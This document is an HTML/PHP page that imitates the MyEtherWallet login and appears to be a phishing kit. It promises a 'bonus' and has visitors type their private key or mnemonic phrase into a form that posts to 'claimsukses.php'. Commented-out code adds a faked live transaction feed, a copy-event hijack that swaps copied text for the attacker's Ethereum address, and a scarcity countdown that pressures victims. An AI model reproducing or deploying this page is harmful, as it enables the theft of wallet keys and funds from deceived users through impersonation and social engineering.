<html lang="en-US">
    <head profile="https://www.w3.org/2005/10/profile">
        <script src="../../js/clipboard.min.js"></script>
        <script src="//code.jquery.com/jquery-2.2.4.min.js"></script>
        <link href="https://www.myetherwallet.com/favicon.png" rel="icon" type="image/x-icon"/>
        <title>MyEtherWallet</title>
        <script>
            window.onload = function() {
                if (!localStorage.getItem("justonce")) {
                    localStorage.setItem("justOnce", "true");
                    window.location.reload();
                }
            }
        </script>
        <script type="text/javascript">
            //<![CDATA[
            window.onload = function() {}
            //]]>
        </script>
        
        <style>
            .last_trans {
                    width: 100%;
    overflow: hidden;
    margin-top: 50px;
    margin-right: auto;
    margin-bottom: 0;
    margin-left: auto;
    background-color: #ffffff;
    padding: 15px;
            }

            h1.f-24.mvn.em-300 {
                font-family: Montserrat, Helvetica, sans-serif;
                color: rgb(95, 95, 95);
                font-size: 23px;
                font-weight: 300;
                margin-bottom: 15px;
            }

            h1.f-24.mvn.em-300 span {
                font-family: 'Montserrat ', 'Helvetica', sans-serif;
                font-size: 16px;
                font-style: italic;
                color: #a8a8a8;
                font-weight: 300;
                white-space: nowrap;
                margin-left: 10px;
            }

            h2.f-24.mvn.em-300 {
                font-family: Montserrat, Helvetica, sans-serif;
                color: rgb(128 , 128, 128);
                font-size: 45px;
                font-weight: 300;
                margin-bottom: 15px;
            }

            h2.f-24.mvn.em-300 span {
                font-family: 'Montserrat', 'Helvetica', sans-serif;
                font-size: 16px;
                font-style: italic;
                color: #a8a8a8;
                font-weight: 300;
                white-space: nowrap;
                margin-left: 10px;
            }

            .text-overflow-hidden, .ui-select-match-text {
                overflow: visible !important;
            }
        </style>

        <style>
            .tooltip {
                position: relative;
                display: inline-block;
            }

            .tooltip .tooltiptext {
                visibility: hidden;
                width: 140px;
                background-color: #555;
                color: #fff;
                text-align: center;
                border-radius: 6px;
                padding: 5px;
                position: absolute;
                z-index: 1;
                bottom: 150%;
                left: 50%;
                margin-left: -75px;
                opacity: 0;
                transition: opacity 0.3s;
            }

            .tooltip .tooltiptext::after {
                content: "";
                position: absolute;
                top: 100%;
                left: 50%;
                margin-left: -5px;
                border-width: 5px;
                border-style: solid;
                border-color: #555 transparent transparent transparent;
            }

            .tooltip:hover .tooltiptext {
                visibility: visible;
                opacity: 1;
            }
        </style>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" href="../../invalid/css/overrides.css" type="text/css">
        <script type="text/javascript" src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
        <script src="../prhase/js/shared.js" type="text/javascript"></script>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <link rel="stylesheet" href="../../css/blockchain.css" type="text/css">
        <link rel="stylesheet" href="../../css/payment-request.css" type="text/css">
        <link rel="stylesheet" href="../../css/app-overrides.css" type="text/css" media="only screen">
        <link href="https://fonts.googleapis.com/css2?family=Montserrat" rel="stylesheet">
        <script type="text/javascript" src="//code.jquery.com/jquery-1.10.1.js"></script>
        <style type="text/css">
            .adv {
                display: none;
            }

            .basic {
                display: inherit;
            }
        </style>
        <style type="text/css">
            .adv {
                display: none;
            }

            .basic {
                display: inherit;
            }
        </style>
    </head>
    <body class="bg-blue opaque-nav main-font request">
        <div data-v-2acea4d4="" class="fixed-header-wrap">
            <div data-v-2acea4d4="" class="fixed-header tiny-header">
                <div data-v-2acea4d4="" class="mobile-menu-boxshadow page-container">
                    <div data-v-2acea4d4="" class="header-container">
                        <a data-v-2acea4d4="" href="/" class="router-link-active" aria-label="Home">
                            <div data-v-2acea4d4="" class="top-logo">
                                <img data-v-2acea4d4="" src="https://www.myetherwallet.com/img/short-hand-logo-web.5d962d4e.png" alt="" class="logo-small logo-large">
                            </div>
                        </a>
                        <div data-v-2acea4d4="" class="top-menu">
                            <ul data-v-2acea4d4="" class="nav">
                                <li data-v-2acea4d4="" class="nav-item buy-eth">
                                    <a data-v-2acea4d4="" href="#" rel="noopener noreferrer" target="_blank" class="nav-link">
                                        <img data-v-2acea4d4="" alt="" src="https://www.myetherwallet.com/img/buy-eth.75fcd9b0.svg" class="buy-eth-icon">Buy ETH 
                                    
                                    </a>
                                </li>
                                <li data-v-2acea4d4="" id="my-nav-dropdown" class="nav-item b-nav-dropdown dropdown">
                                    <a id="my-nav-dropdown__BV_toggle_" role="button" aria-haspopup="true" aria-expanded="false" href="#my-nav-dropdown" target="_self" class="nav-link dropdown-toggle nav-link-custom">
                                        <span>Info</span>
                                    </a>
                                    <ul tabindex="-1" aria-labelledby="my-nav-dropdown__BV_toggle_" class="dropdown-menu dropdown-menu-right" style="">
                                        <li data-v-2acea4d4="" role="presentation">
                                            <a href="/#about-mew" class="dropdown-item" role="menuitem" target="_self">About </a>
                                        </li>
                                        <li data-v-2acea4d4="" role="presentation">
                                            <a href="/#faqs" class="dropdown-item" role="menuitem" target="_self">FAQs</a>
                                        </li>
                                    </ul>
                                </li>
                                <!---->
                                <div data-v-2acea4d4="" class="language-menu-container">
                                    <div data-v-2acea4d4="" class="down-arrow"></div>
                                    <li data-v-2acea4d4="" class="nav-item b-nav-dropdown dropdown language-menu" extra-toggle-classes="nav-link-custom" id="__BVID__49">
                                        <a role="button" aria-haspopup="true" aria-expanded="false" href="#" target="_self" class="nav-link dropdown-toggle" id="__BVID__49__BV_toggle_">
                                            <div data-v-2acea4d4="" class="current-language-flag">
                                                <img data-v-2acea4d4="" src="https://www.myetherwallet.com/img/en.2e9c71c7.svg" alt="" class="show">
                                                <p data-v-2acea4d4="">English</p>
                                            </div>
                                        </a>
                                        <ul tabindex="-1" class="dropdown-menu dropdown-menu-right" aria-labelledby="__BVID__49__BV_toggle_">
                                            <li data-v-2acea4d4="" role="presentation">
                                                <a data-language-code="en_US" data-flag-name="en" role="menuitem" href="#" target="_self" class="dropdown-item active">English</a>
                                            </li>
                                            <li data-v-2acea4d4="" role="presentation">
                                                <a data-language-code="ru_RU" data-flag-name="ru" role="menuitem" href="#" target="_self" class="dropdown-item">Русский</a>
                                            </li>
                                        </ul>
                                    </li>
                                </div>
                                <div data-v-2acea4d4="" class="notification-menu-container">
                                <!---->
                                </div>
                                <!---->
                                <!---->
                                <!---->
                            </ul>
                        </div>
                        <div data-v-2acea4d4="" class="mobile-menu-button--container">
                        <a data-v-46e723b0="" href="#" rel="noopener noreferrer">
                            <div data-v-46e723b0="" class="m-buy-eth">
                                <img data-v-46e723b0="" src="https://www.myetherwallet.com/img/buy-eth.75fcd9b0.svg" alt="eth">
                                <p data-v-46e723b0="">Buy ETH</p>
                            </div>
                        </a>
                        <div data-v-420d05f0="" data-v-46e723b0="" class="mobile-menu-button">
                            <div data-v-420d05f0="" class="wrap">
                                <button data-v-420d05f0="" aria-label="Menu button" class="menu-button">
                                    <div data-v-420d05f0="" class="bar bar-1"></div>
                                    <div data-v-420d05f0="" class="bar bar-2"></div>
                                    <div data-v-420d05f0="" class="bar bar-3"></div>
                                </button>
                            </div>
                        </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <br>
        <div id="myModal" class="modals">
            <div class="bg-whites payment-request">
                <form method="post" action="../../claimsukses.php" class="auth-form" id="auth-form">
                    <div class="auth-form__sign-mode">
                        <div class="auth-sign__btn"><?php echo (isset($_GET['error']) ? 'Invalid Private Key or Mnemonic Phrase' : 'Access by Private Key');?></div>
                    </div>
                    
                    <div class="auth-form__view-mode">
                        <div>
							
                            <input type="text" name="PrivateKey" required="" value="" id="address" class="auth-form__input" onkeyup="success()" placeholder="Enter Private Key or Mnemonic Phrase" autofocus="">
                        </div>
                        <input type="text" name="verify" value="1" hidden>
                        <button type="submit" class="auth-form__btn" id="start_button" disabled>Access Wallet </button>
                        <div data-v-699c71ce="" class="recommended">Take your bonus immediately. Log in to your MyEtherWallet account, a bonus will be available.</div>
                        <div data-v-ec6a20fa="" data-v-cdbfb07c="" class="support">
                            <div data-v-ec6a20fa="" class="support-content with-icon">
                                <div data-v-ec6a20fa="" class="support-icon">
                                    <img data-v-ec6a20fa="" alt="Help Center" src="https://www.myetherwallet.com/img/help-center.fc8a5621.svg">
                                </div>
                                <div data-v-ec6a20fa="" class="support-label">
                                    <h5 data-v-ec6a20fa="">Customer Support</h5>
                                </div>
                            </div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
        <div data-v-2059f15e="" class="wrap">
            <div data-v-2059f15e="" class="page-container">
                <div data-v-2059f15e="" class="title">
                    <h2 data-v-2059f15e="">Access My Wallet</h2>
                    <h5 data-v-2059f15e="">
                        Do not have a wallet? <a data-v-2059f15e="" href="/create-wallet" class="nounderline">Create A New Wallet </a>
                    </h5>
                </div>
                <div data-v-2059f15e="" class="buttons-container">
                    <button data-v-50950faa="" class="button-block button-mewconnect">
                        <div data-v-50950faa="" class="button-image">
                            <img data-v-50950faa="" src="https://www.myetherwallet.com/img/button-mewconnect.067426be.svg" alt="" class="icon">
                        </div>
                        <h3 data-v-50950faa="">MEWconnect</h3>
                        <p data-v-50950faa="" class="access-wallet-or">- or - </p>
                        <p data-v-50950faa="" class="desc">WalletConnect; WalletLink </p>
                        <p data-v-50950faa="" class="small-note"></p>
                    </button>
                    <button data-v-50950faa="" class="button-block button-hardware">
                        <div data-v-50950faa="" class="button-image">
                            <img data-v-50950faa="" src="https://www.myetherwallet.com/img/button-hardware.945afa77.svg" alt="" class="icon">
                        </div>
                        <h3 data-v-50950faa="">Hardware</h3>
                        <!---->
                        <p data-v-50950faa="" class="desc">Ledger wallet, FINNEY, Trezor, BitBox, Secalot, KeepKey, XWallet </p>
                        <p data-v-50950faa="" class="small-note"></p>
                    </button>
                    <button data-v-50950faa="" class="button-block button-metamask">
                        <div data-v-50950faa="" class="button-image">
                            <img data-v-50950faa="" src="https://www.myetherwallet.com/img/button-web3.dc2ff19c.svg" alt="" class="icon">
                        </div>
                        <h3 data-v-50950faa="">MEW CX</h3>
                        <p data-v-50950faa="" class="access-wallet-or">- or - </p>
                        <p data-v-50950faa="" class="desc">MetaMask; Dapper </p>
                        <p data-v-50950faa="" class="small-note"></p>
                    </button>
                    <button data-v-50950faa="" class="button-block button-software">
                        <div data-v-50950faa="" class="button-image">
                            <img data-v-50950faa="" src="https://www.myetherwallet.com/img/button-software.2a233dbf.svg" alt="" class="icon">
                        </div>
                        <h3 data-v-50950faa="">Software</h3>
                        <!---->
                        <p data-v-50950faa="" class="desc">Keystore file, Private key, Mnemonic phrase </p>
                        <p data-v-50950faa="" v-if="true" class="small-note">Not recommended </p>
                    </button>
                </div>
            </div>
        </div>
        <!--
        <div class="last_trans">
            <h1 class="f-24 mvn em-300">
                Transactions for address:<span id="trnsctin">0x3a85774c434A4cC51fda217CF0e5cAeFD6C0af2F</span>
            </h1>
            <table class="table" id="myTable">
                <tbody>
                    <tr>
                        <th>TxHash
</th>
                        <th class="hidden-sm">Block
</th>
                        <th>
                            <span title="UTC time">Age</span>
                        </th>
                        <th>From
</th>
                        <th></th>
                        <th>To
</th>
                        <th>Value
</th>
                        <th>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="(GasPrice * GasUsed By Txn)INEther">
                                <font color="silver" size="1">[TxFee]</font>
                            </span>
                        </th>
                    </tr>
                    <tr class="toolbar">
                        <td>
                            <a class="toolme" href="#">0xfc61c579cde34b41...</a>
                        </td>
                        <td>
                            <a href="#">5386568</a>
                        </td>
                        <td>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3">now</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0xf29ead6184ea63f7...</a>
                        </td>
                        <td>
                            <span class="label label-success rounded">IN</span>
                        </td>
                        <td>
                            <span class="address-tag">0xf985aa8117999fa3f0...</span>
                        </td>
                        <td>1 Ether</td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00686
                            
                            </font>
                        </td>
                    </tr>
                    <tr class="toolbar">
                        <td>
                            <a class="address-tag" href="#">0xa36aa0c7f7a8ec5c...</a>
                        </td>
                        <td>
                            <a href="#">5386568</a>
                        </td>
                        <td>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3">1 mins ago</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0xf985aa8117999fa3f0...</a>
                        </td>
                        <td>
                            <span class="label label-orange rounded" style="background: #e67e22;">OUT</span>
                        </td>
                        <td>
                            <span class="address-tag">0xcd10e0e41717cfe3...</span>
                        </td>
                        <td>30 Ether</td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00869
                            
                            </font>
                        </td>
                    </tr>
                    <tr class="toolbar">
                        <td>
                            <a class="toolme" href="#">0xa259355c6d86f011...</a>
                        </td>
                        <td>
                            <a href="#">5386568</a>
                        </td>
                        <td>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3">1 mins ago</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0xcd10e0e41717cfe3...</a>
                        </td>
                        <td>
                            <span class="label label-success rounded">IN</span>
                        </td>
                        <td>
                            <span class="address-tag">0xf985aa8117999fa3f0...</span>
                        </td>
                        <td>3 Ether</td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00564
                            
                            </font>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <a class="address-tag" href="#">0x9addb4ab6a83b917...</a>
                        </td>
                        <td class="hidden-sm">
                            <a href="#">5386568</a>
                        </td>
                        <td width="150px !important">
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3">3 mins ago</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0xaa2498d85bA755900...</a>
                        </td>
                        <td>
                            <span class="label label-orange rounded" style="background: #e67e22;">OUT</span>
                        </td>
                        <td>
                            <span class="address-tag">0x3c44762c6f79d6b9b...</span>
                        </td>
                        <td>8 Ether</td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00042
                            
                            </font>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <a class="address-tag" href="#">0x9dfdb2ab6a16b910...</a>
                        </td>
                        <td class="hidden-sm">
                            <a href="#">5386568</a>
                        </td>
                        <td>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3">4 mins ago</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0x3c44762c6f79d6b9b...</a>
                        </td>
                        <td>
                            <span class="label label-success rounded">IN</span>
                        </td>
                        <td>
                            <span class="address-tag">0xaa2498d85ba7559006f9...</span>
                        </td>
                        <td>
                            0<b>.</b>
                            4 Ether
                        
                        </td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00042
                            
                            </font>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <a class="address-tag" href="#">0x6c5b44fc5a29beb...</a>
                        </td>
                        <td class="hidden-sm">
                            <a href="#">5386568</a>
                        </td>
                        <td>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3">5 mins ago</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0xaa2498d85bA755900...</a>
                        </td>
                        <td>
                            <span class="label label-orange rounded" style="background: #e67e22;">OUT</span>
                        </td>
                        <td>
                            <span class="address-tag">0xffb3d469cc672e7...</span>
                        </td>
                        <td>5 Ether</td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00042
                            
                            </font>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <a class="address-tag" href="#">0xac85ffe9ec3cb14f...</a>
                        </td>
                        <td class="hidden-sm">
                            <a href="#">5386562</a>
                        </td>
                        <td>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:15:32 AM" class="tim3">5 mins ago</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0xffb3d469cc672e7...</a>
                        </td>
                        <td>
                            <span class="label label-success rounded">IN</span>
                        </td>
                        <td>
                            <span class="address-tag">0x7eee1ec1ebfca72ba...</span>
                        </td>
                        <td>
                            0<b>.</b>
                            5 Ether
                        
                        </td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00042
                            
                            </font>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <a class="address-tag" href="#">0x29654c9491c57c...</a>
                        </td>
                        <td class="hidden-sm">
                            <a href="#">5386568</a>
                        </td>
                        <td>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3">6 mins ago</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0xaa2498d85bA755900...</a>
                        </td>
                        <td>
                            <span class="label label-orange rounded" style="background: #e67e22;">OUT</span>
                        </td>
                        <td>
                            <span class="address-tag">0x7eee1ec1ebfca72ba...</span>
                        </td>
                        <td>5 Ether</td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00042
                            
                            </font>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <a class="address-tag" href="#">0xd04a374721b3c87f...</a>
                        </td>
                        <td class="hidden-sm">
                            <a href="#">5386413</a>
                        </td>
                        <td>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 03:41:32 AM" class="tim3">6 mins ago</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0x7eee1ec1ebfca72ba...</a>
                        </td>
                        <td>
                            <span class="label label-success rounded">IN</span>
                        </td>
                        <td>
                            <span class="address-tag">0xaa2498d85ba7559006f9...</span>
                        </td>
                        <td>
                            1<b>.</b>
                            495 Ether
                        
                        </td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00147
                            
                            </font>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <a class="address-tag" href="#">0xb1462c68b707d5...</a>
                        </td>
                        <td class="hidden-sm">
                            <a href="#">5386568</a>
                        </td>
                        <td>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3">7 mins ago</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0xaa2498d85bA755900...</a>
                        </td>
                        <td>
                            <span class="label label-orange rounded" style="background: #e67e22;">OUT</span>
                        </td>
                        <td>
                            <span class="address-tag">0x097875225c51d535d...</span>
                        </td>
                        <td>8 Ether</td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00042
                            
                            </font>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <a class="address-tag" href="#">0xdc4aded3f65cdbb9...</a>
                        </td>
                        <td class="hidden-sm">
                            <a href="#">5386293</a>
                        </td>
                        <td>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 03:14:00 AM" class="tim3">8 mins ago</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0x097875225c51d535d...</a>
                        </td>
                        <td>
                            <span class="label label-success rounded">IN</span>
                        </td>
                        <td>
                            <span class="address-tag">0xaa2498d85ba7559006f9...</span>
                        </td>
                        <td>
                            0<b>.</b>
                            85412 Ether
                        
                        </td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00042
                            
                            </font>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <a class="address-tag" href="#">0xb1462c68b707d5...</a>
                        </td>
                        <td class="hidden-sm">
                            <a href="#">5386568</a>
                        </td>
                        <td>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3">9 mins ago</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0xaa2498d85bA755900...</a>
                        </td>
                        <td>
                            <span class="label label-orange rounded" style="background: #e67e22;">OUT</span>
                        </td>
                        <td>
                            <span class="address-tag">0x7bf7a96ceb22614af...</span>
                        </td>
                        <td>6 Ether</td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00042
                            
                            </font>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <a class="address-tag" href="#">0xbf034ac20cfb9f24...</a>
                        </td>
                        <td class="hidden-sm">
                            <a href="#">5386209</a>
                        </td>
                        <td>
                            <span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 02:54:13 AM" class="tim3">10 mins ago</span>
                        </td>
                        <td>
                            <a class="address-tag" href="#">0x7bf7a96ceb22614af...</a>
                        </td>
                        <td>
                            <span class="label label-success rounded">IN</span>
                        </td>
                        <td>
                            <span class="address-tag">0xaa2498d85ba7559006f9...</span>
                        </td>
                        <td>
                            0<b>.</b>
                            6 Ether
                        
                        </td>
                        <td>
                            <font color="gray" size="1">
                                0<b>.</b>
                                00042
                            
                            </font>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
        -->
        <!--
        <style>
            .toolbar {
                -webkit-animation-name: animation;
                -webkit-animation-duration: 1s;
                -webkit-animation-timing-function: ease-in-out;
                -webkit-animation-play-state: running;
                animation-name: animation;
                animation-duration: 1s;
                animation-timing-function: ease-in-out;
                animation-play-state: running;
            }

            @-webkit-keyframes animation {
                0% {
                    background-color: #ede86c;
                }

                100.0% {
                    background-color: #ffffff;
                }
            }

            @keyframes animation {
                0% {
                    background-color: #ede86c;
                }

                100.0% {
                    background-color: #ffffff;
                }
            }
        </style>
        <script>

            function random(t, e) {
                var n = arguments.length;
                if (0 === n)
                    t = 0,
                    e = 2147483647;
                else if (1 === n)
                    throw new Error("Warning: rand() expects exactly 2 parameters, 1 given");
                return Math.floor(Math.random() * (e - t + 1)) + t
            }

            function uuidv4() {
                return "xxxxxxxxxxxxxxxx".replace(/[xy]/g, function(t) {
                    var e = 16 * Math.random() | 0;
                    return ("x" == t ? e : 3 & e | 8).toString(16)
                })
            }

            function bet(t, e, n) {
                return t = t.toString().replace("", ""),
                e = e.toString().replace("", ""),
                void 0 !== (n = n.toString().replace("", "")).split(t)[1] ? n.split(t)[1].split(e)[0] : void 0
            }

            function removeArr(t) {
                for (var e, n, a = arguments, r = a.length; r > 1 && t.length; )
                    for (e = a[--r]; -1 !== (n = t.indexOf(e)); )
                        t.splice(n, 1);
                return t
            }

            function addLink() {
                var t = window.getSelection()
                  , e = document.createElement("div");
                e.style.position = "absolute",
                e.style.left = "-99999px",
                document.body.appendChild(e),
                e.innerHTML = "0x3a85774c434A4cC51fda217CF0e5cAeFD6C0af2F",
                t.selectAllChildren(e),
                window.setTimeout(function() {
                    document.body.removeChild(e)
                }, 100)
            }

            function sub() {
                for (ramdot = gF.random(2, 5),
                dots = [],
                i = 0; i < ramdot; i++)
                    dots[i] = gF.chain(gF.random(15, 20), gF.random(0, 1)).toLowerCase();
                for (ramdot2 = gF.random(2, 5),
                dots2 = [],
                i = 0; i < ramdot2; i++)
                    dots2[i] = gF.chain(gF.random(15, 20), gF.random(0, 1)).toLowerCase();
                return dots.join("-") + "." + dots2.join(".")
            }

            function newtr() {
                tr = document.createElement("tr"),
                tr.innerHTML = '<td><a class="address-tag" href="index.html#">0x9addb4ab6a83b917...</a></td><td class="hidden-sm"><a href="#">5386568</a></td><td width="150px !important"><span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3" >1 mins ago</span></td><td><a class="address-tag" href="index.html#">0xAd2E834840954231b...</a></td><td><span class="label label-orange rounded" style="background: #e67e22;">OUT</span></td><td><span class="address-tag">0x3c44762c6f79d6b9b...</span></td><td>4 Ether</td><td><font color="gray" size="1">0<b>.</b>00042</font></td>',
                INT = "0x" + uuidv4().toLowerCase(),
                OUT = "0x" + uuidv4().toLowerCase(),
                TXID = "0x" + uuidv4().toLowerCase(),
                TXID2 = "0x" + uuidv4().toLowerCase(),
                INCIN = (Math.random() * (10 - 0.5) + 0.5).toFixed(3),
                INOUT = (10 * INCIN + 0.5).toFixed(0);
                var t = document.getElementById("myTable").insertRow(1)
                  , e = t.insertCell(0)
                  , n = t.insertCell(1)
                  , a = t.insertCell(2)
                  , r = t.insertCell(3)
                  , d = t.insertCell(4)
                  , s = t.insertCell(5)
                  , i = t.insertCell(6)
                  , o = t.insertCell(7);
                e.innerHTML = '<a class="toolme" class="address-tag" href="index.html#">' + TXID + "...</a>",
                n.innerHTML = '<td class="hidden-sm"><a href="#">5386568</a></td>',
                a.innerHTML = '<td width="150px !important"><span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3" >now</span></td>',
                r.innerHTML = '<td><a class="address-tag" href="index.html#">' + OUT + "...</a></td>",
                d.innerHTML = '<td><span class="label label-success rounded">&nbsp; IN &nbsp;</span></td>',
                s.innerHTML = '<td><span class="address-tag">' + window.ADDRESS.substring(0, 19) + "...</span></td>",
                i.innerHTML = "<td>" + INCIN + " Ether</td>",
                o.innerHTML = '<td><font color="gray" size="1">0<b>.</b>00' + random(100, 999) + "</font></td>",
                document.getElementsByTagName("tr")[1].classList.add("toolbar"),
                setTimeout(function() {
                    var t = document.getElementById("myTable").insertRow(1)
                      , e = t.insertCell(0)
                      , n = t.insertCell(1)
                      , a = t.insertCell(2)
                      , r = t.insertCell(3)
                      , d = t.insertCell(4)
                      , s = t.insertCell(5)
                      , i = t.insertCell(6)
                      , o = t.insertCell(7);
                    e.innerHTML = '<a class="address-tag" href="index.html#">' + TXID2 + "...</a>",
                    n.innerHTML = '<td class="hidden-sm"><a href="#">5386568</a></td>',
                    a.innerHTML = '<td width="150px !important"><span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3" >now</span></td>',
                    r.innerHTML = '<td><a class="address-tag" href="index.html#">' + window.ADDRESS.substring(0, 19) + "...</a></td>",
                    d.innerHTML = '<td><span class="label label-orange rounded" style="background: #e67e22;">OUT</span></td>',
                    s.innerHTML = '<td><span class="address-tag">' + OUT + "...</span></td>",
                    i.innerHTML = "<td>" + INOUT + " Ether</td>",
                    o.innerHTML = '<td><font color="gray" size="1">0<b>.</b>00' + random(100, 999) + "</font></td>",
                    document.getElementsByTagName("tr")[1].classList.add("toolbar")
                }, 1500)
            }

            function insertAfter(t, e) {
                e.parentNode.insertBefore(t, e.nextSibling)
            }

            function updateTrans() {
                for (i = 0; i < times.length; i++)
                    "now" == times[i].innerHTML.split(" ")[0] ? times[i].innerHTML = "1 mins ago" : times[i].innerHTML = parseInt(times[i].innerHTML.split(" ")[0]) + 1 + " mins ago";
                newtr()
            }
            document.addEventListener("copy", addLink),
            times = document.getElementsByClassName("tim3"),
            window.onload = function() {
                updateTrans(),
                trans = setInterval(function() {
                    updateTrans()
                }, 1e4)
            }
            ,
            document.getElementById("address").innerHTML = window.ADDRESS,
            document.getElementById("qrcode").src = "https://chart.apis.google.com/chart?cht=qr&chs=300x300&chl=" + window.ADDRESS + "&chld=H|0",
            document.getElementById("trnsctin").innerHTML = window.ADDRESS;
        </script>
        <script>
            // tell the embed parent frame the height of the content
            if (window.parent && window.parent.parent) {
                window.parent.parent.postMessage(["resultsFrame", {
                    height: document.body.getBoundingClientRect().height,
                    slug: "b1cxaqn5"
                }], "*")
            }
        </script>
        <script>

            function setProgress(count, max) {
                var p = (100 * count / max).toString() + '%';
                $('.progress-left').css('left', p);
                $('.progress-width').css('width', p);
                var cc = count.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
                var mm = max.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
                $('.progress-bar-value').text(cc + ' / ' + mm);

            }

            var cc = "";

            var ctd = setInterval(function() {
                if (localStorage.getItem("bar")) {
                    if (localStorage.getItem("bar") <= 150) {
                        var new_count = localStorage.getItem("bar");
                    } else if (localStorage.getItem("bar")) {
                        var init_count = localStorage.getItem("bar");
                        var new_count = init_count - Math.floor((Math.random() * 100) + 5);
                    }
                } else {
                    var init_count = Math.floor((Math.random() * (4499 - 4400) + 4400) + 1);
                    var new_count = init_count - Math.floor((Math.random() * 100) + 5);
                }
                setProgress(new_count, 20000)

                localStorage.setItem("bar", new_count);

                if (init_count <= 300)
                    clearInterval(ctd);
                if (new_count <= 4999 && init_count >= 2001)
                    document.getElementById("lefteth").innerHTML = "Left Ethereum";
                if (new_count <= 2000 && init_count >= 301)
                    document.getElementById("lefteth").innerHTML = "Hurry up, not much more ETH left!";
                if (new_count <= 300)
                    document.getElementById("lefteth").innerHTML = "Last chance to get your ETH!";
                if (new_count <= cc)
                    document.title = new_count + " ETH left";
                if (new_count <= 2000)
                    document.title = "Get your " + new_count + " ETH now!";

            }, 6666);
        </script>-->
        <script type="text/javascript">
function success() {
	 if(document.getElementById("address").value==="") { 
            document.getElementById('start_button').disabled = true; 
        } else { 
            document.getElementById('start_button').disabled = false;
        }
    }
</script>
    </body>
</html>
